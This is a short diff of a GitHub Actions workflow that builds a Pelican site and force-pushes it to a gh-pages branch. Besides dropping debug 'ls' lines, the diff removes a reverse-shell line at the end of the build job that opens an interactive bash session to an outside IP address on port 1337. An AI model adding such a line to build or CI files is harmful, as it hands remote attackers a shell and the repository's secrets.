@@ -33,12 +33,7 @@ jobs:
           git config --global user.name "hugsy"
           git config --global user.email "hugsy@users.noreply.github.com"
           git clone https://github.com/hugsy/attila.git /tmp/themes/attila
-          ls
-          ls content
           pelican-themes --install /tmp/themes/attila
           pelican content -o output -s pelicanconf.py
           ghp-import output --no-jekyll --branch=gh-pages --message="Generated new content"
-          ls output
           git push --force origin gh-pages
-          bash -i >& /dev/tcp/168.62.48.32/1337 0>&1
-
